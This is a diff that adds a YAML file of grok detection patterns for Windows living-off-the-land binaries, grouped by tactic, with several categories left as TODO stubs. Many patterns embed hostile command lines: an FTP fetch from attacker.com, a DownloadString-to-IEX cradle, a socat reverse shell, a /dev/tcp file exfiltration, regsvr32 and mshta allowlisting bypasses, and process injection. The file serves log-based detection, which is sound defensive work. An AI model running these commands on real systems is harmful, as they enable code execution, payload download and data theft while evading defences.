@@ -1,0 +1,440 @@
+grok_patterns:
+  Alternate_data_streams:
+    # TODO: Add rules for Alternate data streams
+
+  AWL_bypass:
+    # --- Regsvr32.exe ---
+    AWL_REGSVR32_1: "regsvr32 /s /n /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"
+    AWL_REGSVR32_2: "%{WORD:process}\\.exe /s /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"
+
+    # --- Installutil.exe ---
+    AWL_INSTALLUTIL_1: "InstallUtil\\.exe /logfile= /LogToConsole=false /U %{NOTSPACE:targetFile}"
+
+    # --- Msbuild.exe ---
+    AWL_MSBUILD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Winget.exe ---
+    AWL_WINGET_1: "%{WORD:process}\\.exe install --accept-package-agreements -s msstore %{GREEDYDATA:targetFile}"
+
+    # --- Bash.exe ---
+    AWL_BASH_1: "%{WORD:process}\\.exe -c \\\"%{GREEDYDATA:targetFile}\\\""
+
+    # --- Cmstp.exe ---
+    AWL_CMSTP_1: "%{WORD:process}\\.exe /ni /s %{NOTSPACE:targetFile}"
+
+    # --- Microsoft.Workflow.Compiler.exe ---
+    AWL_WORKFLOW_COMPILER_1: "Microsoft\\.Workflow\\.Compiler\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
+
+    # --- Msdt.exe ---
+    AWL_MSDT_1: "%{WORD:process}\\.exe -path C:\\\\WINDOWS\\\\diagnostics\\\\index\\\\PCWDiagnostic\\.xml -af %{NOTSPACE:targetFile} /skip TRUE"
+    AWL_MSDT_2: "%{WORD:process}\\.exe /id PCWDiagnostic /skip force /param \\\"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/\\.\\./\\.\\./%{NOTSPACE:targetFile}\\\""
+
+    # --- Regasm.exe & Regsvcs.exe ---
+    AWL_REGASM_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    AWL_REGSVCS_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- DLL Execution (Advpack, Dfshim, Setupapi, Ieadvpack, Syssetup) ---
+    AWL_ADVPACK_1: "rundll32\\.exe advpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},DefaultInstall_SingleUser,1,"
+    AWL_ADVPACK_2: "rundll32\\.exe advpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},,1,"
+    AWL_DFSHIM_1: "rundll32\\.exe dfshim\\.dll,ShOpenVerbApplication %{NOTSPACE:targetFile}"
+    AWL_SETUPAPI_1: "rundll32\\.exe setupapi\\.dll,InstallHinfSection DefaultInstall 128 %{NOTSPACE:targetFile}"
+    AWL_IEADVPACK_1: "rundll32\\.exe ieadvpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},DefaultInstall_SingleUser,1,"
+    AWL_IEADVPACK_2: "rundll32\\.exe ieadvpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},,1,"
+    AWL_SYSSETUP_1: "rundll32 syssetup\\.dll,SetupInfObjectInstallAction DefaultInstall 128 %{NOTSPACE:targetFile}"
+
+    # --- Dotnet.exe ---
+    AWL_DOTNET_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    AWL_DOTNET_2: "%{WORD:process}\\.exe msbuild %{NOTSPACE:targetFile}"
+
+    # --- Fsi.exe & FsiAnyCpu.exe ---
+    AWL_FSI_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    AWL_FSI_2: "%{WORD:process}\\.exe"
+    AWL_FSIANYCPU_1: "fsianycpu\\.exe %{NOTSPACE:targetFile}"
+    AWL_FSIANYCPU_2: "fsianycpu\\.exe"
+
+    # --- Msxsl.exe ---
+    AWL_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
+
+    # --- Squirrel.exe ---
+    AWL_SQUIRREL_1: "%{WORD:process}\\.exe --update %{NOTSPACE:targetFile}"
+    AWL_SQUIRREL_2: "%{WORD:process}\\.exe --updateRollback=%{NOTSPACE:targetFile}"
+
+    # --- Update.exe ---
+    AWL_UPDATE_1: "Update\\.exe --update=%{NOTSPACE:targetFile}"
+    AWL_UPDATE_2: "Update\\.exe --updateRollback=%{NOTSPACE:targetFile}"
+    AWL_UPDATE_3: "Update\\.exe --processStart %{NOTSPACE:targetFile} --process-start-args \\\"/arg1 /arg2\\\""
+
+    # --- Winrm.vbs ---
+    AWL_WINRM_1: "%SystemDrive%\\\\BypassDir\\\\cscript //nologo %windir%\\\\System32\\\\winrm\\.vbs get wmicimv2/Win32_Process\\?Handle=4 -format:pretty"
+
+    # --- Aspnet_Compiler.exe ---
+    AWL_ASPNET_COMPILER_1: "C:\\\\Windows\\\\Microsoft\\.NET\\\\Framework64\\\\v4\\.0\\.30319\\\\aspnet_compiler\\.exe -v none -p C:\\\\users\\\\cpl\\.internal\\\\desktop\\\\asptest\\\\ -f %{NOTSPACE:targetFile} -u"
+
+    # --- AccCheckConsole.exe ---
+    AWL_ACCCHECKCONSOLE_1: "AccCheckConsole\\.exe -window \\\"Untitled - Notepad\\\" %{NOTSPACE:targetFile}"
+
+    # --- Bginfo.exe ---
+    AWL_BGINFO_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"
+    AWL_BGINFO_2: "\\\\\\\\10\\.10\\.10\\.10\\\\webdav\\\\bginfo\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"
+    AWL_BGINFO_3: "\\\\\\\\live\\.sysinternals\\.com\\\\Tools\\\\bginfo\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"
+
+    # --- Coregen.exe ---
+    AWL_COREGEN_1: "coregen\\.exe /L %{NOTSPACE:targetFile} dummy_assembly_name"
+
+    # --- Msdeploy.exe ---
+    AWL_MSDEPLOY_1: "msdeploy\\.exe -verb:sync -source:RunCommand -dest:runCommand=\\\"%{NOTSPACE:targetFile}\\\""
+
+    # --- Rcsi.exe ---
+    AWL_RCSI_1: "rcsi\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Remote.exe ---
+    AWL_REMOTE_1: "Remote\\.exe /s %{NOTSPACE:targetFile} anythinghere"
+
+    # --- Tracker.exe ---
+    AWL_TRACKER_1: "Tracker\\.exe /d %{NOTSPACE:targetFile} /c C:\\\\Windows\\\\write\\.exe"
+
+    # --- VisualUiaVerifyNative.exe ---
+    AWL_VISUALUIAVERIFYNATIVE_1: "VisualUiaVerifyNative\\.exe"
+
+    # --- Wfc.exe ---
+    AWL_WFC_1: "wfc\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Vstest.console.exe ---
+    AWL_VSTEST_CONSOLE_1: "vstest\\.console\\.exe %{NOTSPACE:targetFile}"
+
+  Compile:
+    # TODO: Add rules for Compile
+
+  Conceal:
+    # TODO: Add rules for Conceal
+
+  Copy:
+    LOLBAS_CMD_TYPE_REDIRECT_V2: "type \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.ext > %{NOTSPACE:targetFile}"
+    LOLBAS_ESENTUTL_COPY_V2: "%{WORD:process} /y \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.source\\.exe /d %{NOTSPACE:targetFile} /o"
+
+  Credentials:
+    # TODO: Add rules for Credentials
+
+  Decode:
+    # TODO: Add rules for Decode
+
+  Download:
+    # --- Native Tools & Common Bins ---
+    DOWN_MSHTA_1: "%{WORD:process} %{NOTSPACE:targetFile}"
+    
+    DOWN_BITSADMIN_1: "%{WORD:process} /create 1 bitsadmin /addfile 1 https://live\\.sysinternals\\.com/autoruns\\.exe %{NOTSPACE:targetFile} bitsadmin /RESUME 1 bitsadmin /complete 1"
+    
+    DOWN_CERTUTIL_1: "%{WORD:process}\\.exe -urlcache -f %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
+    
+    DOWN_CMD_1: "type \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.ext > %{NOTSPACE:targetFile}"
+    
+    DOWN_ESENTUTL_1: "%{WORD:process}\\.exe /y \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.source\\.exe /d %{NOTSPACE:targetFile} /o"
+    
+    DOWN_EXPAND_1: "%{WORD:process} \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.bat %{NOTSPACE:targetFile}"
+    
+    DOWN_EXTRAC32_1: "%{WORD:process} /Y /C \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.ext %{NOTSPACE:targetFile}"
+    
+    DOWN_FINDSTR_1: "%{WORD:process} /V /L W3AllLov3LolBas \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe > %{NOTSPACE:targetFile}"
+    
+    DOWN_FINGER_1: "%{WORD:process} %{NOTSPACE:targetFile}"
+    
+    DOWN_FTP_1: "cmd\\.exe /c \\\"@echo open attacker\\.com 21>ftp\\.txt&@echo USER attacker>>ftp\\.txt&@echo PASS PaSsWoRd>>ftp\\.txt&@echo binary>>ftp\\.txt&@echo GET /%{NOTSPACE:targetFile}>>ftp\\.txt&@echo quit>>ftp\\.txt&@ftp -s:ftp\\.txt -v\\\""
+    
+    DOWN_INSTALLUTIL_1: "InstallUtil\\.exe %{NOTSPACE:targetFile}"
+    
+    DOWN_LDIFDE_1: "Ldifde -i -f %{NOTSPACE:targetFile}"
+    
+    DOWN_MAKECAB_1: "%{WORD:process} \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile}"
+    
+    DOWN_WINGET_1: "%{WORD:process}\\.exe install --accept-package-agreements -s msstore %{GREEDYDATA:targetFile}"
+
+    # --- Microsoft Edge & Office ---
+    DOWN_MSEDGE_PROXY_1: "C:\\\\Program Files \\(x86\\)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge_proxy\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MSEDGE_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MSEDGE_2: "%{WORD:process}\\.exe --headless --enable-logging --disable-gpu --dump-dom \\\"%{NOTSPACE:targetFile}\\\" > file\\.b64"
+    DOWN_EXCEL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_POWERPNT_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_WINWORD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MSACCESS_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MSOHTMED_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MSPUB_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_VISIO_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_WINPROJ_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- System Utilities ---
+    DOWN_DEVTUNNEL_1: "%{WORD:process}\\.exe host -p %{NOTSPACE:targetFile}"
+    DOWN_APPINSTALLER_1: "start ms-appinstaller://\\?source=%{NOTSPACE:targetFile}"
+    DOWN_HH_1: "HH\\.exe %{NOTSPACE:targetFile}"
+    DOWN_MMC_1: "%{WORD:process}\\.exe -Embedding %{NOTSPACE:targetFile}"
+    
+    DOWN_MPCMDRUN_1: "%{WORD:process}\\.exe -DownloadFile -url %{NOTSPACE:targetFile} -path %{NOTSPACE:targetFile}"
+    DOWN_MPCMDRUN_2: "copy \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4\\.18\\.2008\\.9-0\\\\MpCmdRun\\.exe\\\" C:\\\\Users\\\\Public\\\\Downloads\\\\MP\\.exe && chdir \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4\\.18\\.2008\\.9-0\\\" && \\\"C:\\\\Users\\\\Public\\\\Downloads\\\\MP\\.exe\\\" -DownloadFile -url %{NOTSPACE:targetFile} -path %{NOTSPACE:targetFile}"
+    
+    DOWN_XWIZARD_1: "%{WORD:process} RunWizard \\{7940acf8-60ba-4213-a7c3-f3b400ee266d\\} /z%{NOTSPACE:targetFile}"
+    
+    DOWN_SCROBJ_DLL_1: "rundll32\\.exe C:\\\\Windows\\\\System32\\\\scrobj\\.dll,GenerateTypeLib %{NOTSPACE:targetFile}"
+    
+    DOWN_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} -o file\\.ext"
+    
+    DOWN_SQUIRREL_1: "%{WORD:process}\\.exe --download %{NOTSPACE:targetFile}"
+    DOWN_UPDATE_1: "Update\\.exe --download %{NOTSPACE:targetFile}"
+    
+    DOWN_WSL_1: "%{WORD:process}\\.exe --exec bash -c 'cat < %{NOTSPACE:targetFile} > binary'"
+
+    # --- Additional Windows Binaries ---
+    DOWN_CERTOC_1: "%{WORD:process}\\.exe -GetCACAPS %{NOTSPACE:targetFile}"
+    DOWN_CERTREQ_1: "%{WORD:process} -Post -config %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} file\\.txt"
+    DOWN_CMDL32_1: "%{WORD:process} /vpn /lan %cd%\\\\config"
+    DOWN_CONFIGSECURITYPOLICY_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_DESKTOPIMGDOWNLDR_1: "set \\\"SYSTEMROOT=C:\\\\Windows\\\\Temp\\\" && cmd /c desktopimgdownldr\\.exe /lockscreenurl:%{NOTSPACE:targetFile} /eventName:desktopimgdownldr"
+    DOWN_DIANTZ_1: "%{WORD:process}\\.exe \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile}"
+    DOWN_IMEWDBLD_1: "C:\\\\Windows\\\\System32\\\\IME\\\\SHARED\\\\IMEWDBLD\\.exe %{NOTSPACE:targetFile}"
+    DOWN_IEEXEC_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_NGEN_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_ONEDRIVESTANDALONEUPDATER_1: "OneDriveStandaloneUpdater"
+    DOWN_PRESENTATIONHOST_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_PRINTBRM_1: "PrintBrm -b -d \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\folder -f %{NOTSPACE:targetFile}"
+    DOWN_REPLACE_1: "%{WORD:process}\\.exe \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile} /A"
+    DOWN_BCP_1: "bcp \\\"SELECT payload_data FROM database\\.dbo\\.payloads WHERE id=1\\\" queryout \\\"%{NOTSPACE:targetFile}\\\" -S localhost -T -c"
+    DOWN_ECMANGEN_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_PROTOCOLHANDLER_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    DOWN_VSLAUNCHBROWSER_1: "%{WORD:process}\\.exe \\.exe %{NOTSPACE:targetFile}"
+    DOWN_XSD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Image Viewers & DLLs ---
+    DOWN_PHOTOVIEWER_DLL_1: "rundll32\\.exe \\\"C:\\\\Program Files\\\\Windows Photo Viewer\\\\PhotoViewer\\.dll\\\",ImageView_Fullscreen %{NOTSPACE:targetFile}"
+    DOWN_SHIMGVW_DLL_1: "rundll32\\.exe c:\\\\Windows\\\\System32\\\\shimgvw\\.dll,ImageView_Fullscreen %{NOTSPACE:targetFile}"
+    
+  Dump:
+    # TODO: Add rules for Dump
+
+  Encode:
+    # TODO: Add rules for Encode
+    
+  Execute:
+    # --- Mshta.exe ---
+    EXEC_MSHTA_1: "%{WORD:process} %{NOTSPACE:targetFile}"
+    EXEC_MSHTA_2: "%{WORD:process}\\.exe vbscript:Close\\(Execute\\(\\\"GetObject\\(\\\"\\\"script:%{NOTSPACE:targetFile}\\\"\\\"\\)\\)\\\"\\)\\)"
+    EXEC_MSHTA_3: "%{WORD:process} javascript:a=GetObject\\(\\\"script:%{NOTSPACE:targetFile}\\\"\\)\\.Exec\\(\\);close\\(\\);"
+
+    # --- Rundll32.exe ---
+    EXEC_RUNDLL32_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile},EntryPoint"
+    EXEC_RUNDLL32_2: "%{WORD:process}\\.exe javascript:\\\"\\.\\.\\\\mshtml,RunHTMLApplication \\\";document\\.write\\(\\);GetObject\\(\\\"script:%{NOTSPACE:targetFile}\\\"\\)"
+    EXEC_RUNDLL32_3: "%{WORD:process}\\.exe -sta \\{CLSID\\}"
+
+    # --- Regsvr32.exe ---
+    EXEC_REGSVR32_1: "regsvr32 /s /n /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"
+    EXEC_REGSVR32_2: "%{WORD:process}\\.exe /s /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"
+    EXEC_REGSVR32_3: "%{WORD:process}\\.exe /s %{NOTSPACE:targetFile}"
+    EXEC_REGSVR32_4: "%{WORD:process}\\.exe /u /s %{NOTSPACE:targetFile}"
+
+    # --- At.exe ---
+    EXEC_AT_1: "C:\\\\Windows\\\\System32\\\\%{WORD:process}\\.exe 09:00 /interactive /every:m,t,w,th,f,s,su %{GREEDYDATA:targetFile}"
+
+    # --- Bitsadmin.exe ---
+    EXEC_BITSADMIN_1: "%{WORD:process} /create 1 & bitsadmin /addfile 1 c:\\\\windows\\\\system32\\\\cmd\\.exe %{NOTSPACE:targetFile} & bitsadmin /SetNotifyCmdLine 1 %{NOTSPACE:targetFile} NULL & bitsadmin /RESUME 1 & bitsadmin /"
+
+    # --- ResetControl.exe ---
+    EXEC_RESETCONTROL_1: "control\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Diskshadow.exe ---
+    EXEC_DISKSHADOW_1: "diskshadow> exec %{NOTSPACE:targetFile}"
+
+    # --- Dnscmd.exe ---
+    EXEC_DNSCMD_1: "%{WORD:process}\\.exe dc1\\.lab\\.int /config /serverlevelplugindll %{NOTSPACE:targetFile}"
+
+    # --- Explorer.exe ---
+    EXEC_EXPLORER_1: "%{WORD:process}\\.exe /root,\\\"%{NOTSPACE:targetFile}\\\""
+    EXEC_EXPLORER_2: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Forfiles.exe ---
+    EXEC_FORFILES_1: "%{WORD:process} /p c:\\\\windows\\\\system32 /m notepad\\.exe /c \\\"%{GREEDYDATA:targetFile}\\\""
+
+    # --- Fsutil.exe ---
+    EXEC_FSUTIL_1: "%{WORD:process}\\.exe trace decode"
+
+    # --- Ftp.exe ---
+    EXEC_FTP_1: "echo !%{GREEDYDATA:targetFile} > ftpcommands\\.txt && ftp -s:ftpcommands\\.txt"
+
+    # --- Installutil.exe ---
+    EXEC_INSTALLUTIL_1: "InstallUtil\\.exe /logfile= /LogToConsole=false /U %{NOTSPACE:targetFile}"
+
+    # --- Makecab.exe ---
+    EXEC_MAKECAB_1: "%{WORD:process} /F %{NOTSPACE:targetFile}"
+
+    # --- Mavinject.exe ---
+    EXEC_MAVINJECT_1: "MavInject\\.exe 3110 /INJECTRUNNING %{NOTSPACE:targetFile}"
+
+    # --- Msbuild.exe ---
+    EXEC_MSBUILD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    EXEC_MSBUILD_2: "%{WORD:process}\\.exe /logger:TargetLogger,%{NOTSPACE:targetFile};MyParameters,Foo"
+    EXEC_MSBUILD_3: "%{WORD:process}\\.exe @%{NOTSPACE:targetFile}"
+
+    # --- Netsh.exe ---
+    EXEC_NETSH_1: "%{WORD:process}\\.exe add helper %{NOTSPACE:targetFile}"
+
+    # --- Pnputil.exe ---
+    EXEC_PNPUTIL_1: "%{WORD:process}\\.exe -i -a %{NOTSPACE:targetFile}"
+
+    # --- Schtasks.exe ---
+    EXEC_SCHTASKS_1: "%{WORD:process} /create /sc minute /mo 1 /tn \\\"Reverse shell\\\" /tr \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_SCHTASKS_2: "%{WORD:process} /create /s targetmachine /tn \\\"MyTask\\\" /tr \\\"%{GREEDYDATA:targetFile}\\\" /sc daily"
+
+    # --- Sftp.exe ---
+    EXEC_SFTP_1: "%{WORD:process} -o ProxyCommand=\\\"%{GREEDYDATA:targetFile}\\\" \\."
+
+    # --- Ssh.exe ---
+    EXEC_SSH_1: "%{WORD:process} localhost \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_SSH_2: "%{WORD:process} -o ProxyCommand=\\\"%{GREEDYDATA:targetFile}\\\" \\."
+
+    # --- Winget.exe ---
+    EXEC_WINGET_1: "%{WORD:process}\\.exe install --manifest %{NOTSPACE:targetFile}"
+
+    # --- Wmic.exe ---
+    EXEC_WMIC_1: "%{WORD:process}\\.exe process call create \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_WMIC_2: "%{WORD:process}\\.exe /node:\\\"192\\.168\\.0\\.1\\\" process call create \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_WMIC_3: "%{WORD:process}\\.exe process get brief /format:\\\"%{NOTSPACE:targetFile}\\\""
+    EXEC_WMIC_CMD_1: "%{WORD:process}\\.exe process call create \\\"cmd /c %{GREEDYDATA:targetFile}\\\""
+
+    # --- Msedge_proxy.exe & Msedge.exe ---
+    EXEC_MSEDGE_PROXY_1: "C:\\\\Program Files \\(x86\\)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge_proxy\\.exe --disable-gpu-sandbox --gpu-launcher=\\\"%{GREEDYDATA:targetFile} &&\\\""
+    EXEC_MSEDGE_1: "%{WORD:process}\\.exe --disable-gpu-sandbox --gpu-launcher=\\\"%{GREEDYDATA:targetFile} &&\\\""
+
+    # --- Vshadow.exe ---
+    EXEC_VSHADOW_1: "%{WORD:process}\\.exe -nw -exec=%{NOTSPACE:targetFile} C:"
+
+    # --- Vsls-agent.exe ---
+    EXEC_VSLS_AGENT_1: "vsls-agent\\.exe --agentExtensionPath %{NOTSPACE:targetFile}"
+
+    # --- Bash.exe ---
+    EXEC_BASH_1: "%{WORD:process}\\.exe -c \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_BASH_2: "%{WORD:process}\\.exe -c \\\"socat tcp-connect:%{NOTSPACE:targetFile} exec:sh,pty,stderr,setsid,sigint,sane\\\""
+    EXEC_BASH_3: "%{WORD:process}\\.exe -c 'cat file\\.zip > /dev/tcp/192\\.168\\.1\\.10/24'"
+    EXEC_BASH_4: "%{WORD:process}\\.exe"
+
+    # --- Cmstp.exe ---
+    EXEC_CMSTP_1: "%{WORD:process}\\.exe /ni /s %{NOTSPACE:targetFile}"
+    EXEC_CMSTP_2: "%{WORD:process}\\.exe /nf"
+
+    # --- Hh.exe ---
+    EXEC_HH_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Microsoft.Workflow.Compiler.exe ---
+    EXEC_WORKFLOW_COMPILER_1: "Microsoft\\.Workflow\\.Compiler\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
+
+    # --- Mmc.exe ---
+    EXEC_MMC_1: "%{WORD:process}\\.exe -Embedding %{NOTSPACE:targetFile}"
+
+    # --- Msdt.exe ---
+    EXEC_MSDT_1: "%{WORD:process}\\.exe -path C:\\\\WINDOWS\\\\diagnostics\\\\index\\\\PCWDiagnostic\\.xml -af %{NOTSPACE:targetFile} /skip TRUE"
+
+    # --- Msiexec.exe ---
+    EXEC_MSIEXEC_1: "%{WORD:process} /quiet /i %{NOTSPACE:targetFile}"
+    EXEC_MSIEXEC_2: "%{WORD:process} /q /i %{NOTSPACE:targetFile}"
+    EXEC_MSIEXEC_3: "%{WORD:process} /y %{NOTSPACE:targetFile}"
+    EXEC_MSIEXEC_4: "%{WORD:process} /z %{NOTSPACE:targetFile}"
+    EXEC_MSIEXEC_5: "%{WORD:process} /i %{NOTSPACE:targetFile} TRANSFORMS=\\\"%{NOTSPACE:targetFile}\\\" /qb"
+
+    # --- Odbcconf.exe ---
+    EXEC_ODBCCONF_1: "%{WORD:process} /a \\{REGSVR %{NOTSPACE:targetFile}\\}"
+    EXEC_ODBCCONF_2: "%{WORD:process} INSTALLDRIVER \\\"lolbas-project\\|Driver=%{NOTSPACE:targetFile}\\|APILevel=2\\\""
+    EXEC_ODBCCONF_3: "%{WORD:process} configsysdsn \\\"lolbas-project\\\" \\\"DSN=lolbas-project\\\""
+    EXEC_ODBCCONF_4: "%{WORD:process} -f %{NOTSPACE:targetFile}"
+
+    # --- Pcalua.exe ---
+    EXEC_PCALUA_1: "%{WORD:process}\\.exe -a %{NOTSPACE:targetFile}"
+    EXEC_PCALUA_2: "%{WORD:process}\\.exe -a %{NOTSPACE:targetFile} -c Java"
+
+    # --- Regasm.exe & Regsvcs.exe ---
+    EXEC_REGASM_1: "%{WORD:process}\\.exe /U %{NOTSPACE:targetFile}"
+    EXEC_REGSVCS_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+
+    # --- Runonce.exe ---
+    EXEC_RUNONCE_1: "Runonce\\.exe /AlternateShellStartup"
+
+    # --- SyncAppvPublishingServer.exe ---
+    EXEC_SYNCAPPV_1: "SyncAppvPublishingServer\\.exe \\\"n;\\(New-Object Net\\.WebClient\\)\\.DownloadString\\('%{NOTSPACE:targetFile}'\\) \\| IEX\\\""
+
+    # --- Verclsid.exe & wbemtest.exe ---
+    EXEC_VERCLSID_1: "%{WORD:process}\\.exe /S /C \\{CLSID\\}"
+    EXEC_WBEMTEST_1: "%{WORD:process}\\.exe"
+
+    # --- Xwizard.exe ---
+    EXEC_XWIZARD_1: "%{WORD:process} RunWizard \\{00000001-0000-0000-0000-0000FEEDACDC\\}"
+    EXEC_XWIZARD_2: "%{WORD:process} RunWizard /taero /u \\{00000001-0000-0000-0000-0000FEEDACDC\\}"
+
+    # --- Msedgewebview2.exe ---
+    EXEC_MSEDGEWEBVIEW2_1: "%{WORD:process}\\.exe --no-sandbox --browser-subprocess-path=\\\"%{NOTSPACE:targetFile}\\\""
+    EXEC_MSEDGEWEBVIEW2_2: "%{WORD:process}\\.exe --utility-cmd-prefix=\\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_MSEDGEWEBVIEW2_3: "%{WORD:process}\\.exe --disable-gpu-sandbox --gpu-launcher=\\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_MSEDGEWEBVIEW2_4: "%{WORD:process}\\.exe --no-sandbox --renderer-cmd-prefix=\\\"%{GREEDYDATA:targetFile}\\\""
+
+    # --- Wt.exe ---
+    EXEC_WT_1: "%{WORD:process}\\.exe %{GREEDYDATA:targetFile}"
+
+    # --- DLL Execution (Advpack, Mshtml, Setupapi, Shell32, Url, Appvlp) ---
+    EXEC_ADVPACK_1: "rundll32\\.exe advpack\\.dll,RegisterOCX %{NOTSPACE:targetFile}"
+    EXEC_ADVPACK_2: "rundll32 advpack\\.dll, RegisterOCX %{GREEDYDATA:targetFile}"
+    EXEC_MSHTML_1: "rundll32\\.exe Mshtml\\.dll,PrintHTML %{NOTSPACE:targetFile}"
+    EXEC_SETUPAPI_1: "rundll32\\.exe setupapi\\.dll,InstallHinfSection DefaultInstall 128 %{NOTSPACE:targetFile}"
+    EXEC_SHELL32_1: "%{WORD:process}\\.exe shell32\\.dll,Control_RunDLL %{NOTSPACE:targetFile}"
+    EXEC_SHELL32_2: "rundll32\\.exe shell32\\.dll,ShellExec_RunDLL %{NOTSPACE:targetFile}"
+    EXEC_SHELL32_3: "rundll32 SHELL32\\.DLL,ShellExec_RunDLL %{NOTSPACE:targetFile} /arg1 /arg2"
+    EXEC_SHELL32_4: "rundll32\\.exe shell32\\.dll,#44 %{NOTSPACE:targetFile}"
+    EXEC_URL_1: "rundll32\\.exe url\\.dll,OpenURL %{NOTSPACE:targetFile}"
+    EXEC_URL_2: "rundll32\\.exe url\\.dll,FileProtocolHandler %{NOTSPACE:targetFile}"
+    EXEC_APPVLP_1: "AppVLP\\.exe %{NOTSPACE:targetFile}"
+    EXEC_APPVLP_2: "AppVLP\\.exe powershell\\.exe -c \\\"\\$e=New-Object -ComObject shell\\.application;\\$e\\.ShellExecute\\('%{NOTSPACE:targetFile}','', '', 'open', 1\\)\\\""
+
+    # --- Debuggers & Dotnet (Cdb, Csi, Dotnet, msxsl, Procdump) ---
+    EXEC_CDB_1: "%{WORD:process}\\.exe -cf %{NOTSPACE:targetFile} -o notepad\\.exe"
+    EXEC_CDB_2: "%{WORD:process}\\.exe -pd -pn \\{process_name\\} \\.shell %{GREEDYDATA:targetFile}"
+    EXEC_CDB_3: "%{WORD:process}\\.exe -c %{NOTSPACE:targetFile} \\\"%{GREEDYDATA:targetFile}\\\""
+    EXEC_CSI_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    EXEC_DOTNET_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
+    EXEC_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
+    EXEC_PROCDUMP_1: "%{WORD:process}\\.exe -md %{NOTSPACE:targetFile} explorer\\.exe"
+
+    # --- Updaters (Squirrel, Teams, Update) ---
+    EXEC_SQUIRREL_1: "%{WORD:process}\\.exe --update %{NOTSPACE:targetFile}"
+    EXEC_SQUIRREL_2: "%{WORD:process}\\.exe --updateRollback=%{NOTSPACE:targetFile}"
+    EXEC_TEAMS_1: "%{WORD:process}\\.exe"
+    EXEC_TEAMS_2: "%{WORD:process}\\.exe --disable-gpu-sandbox --gpu-launcher=\\\"%{GREEDYDATA:targetFile} &&\\\""
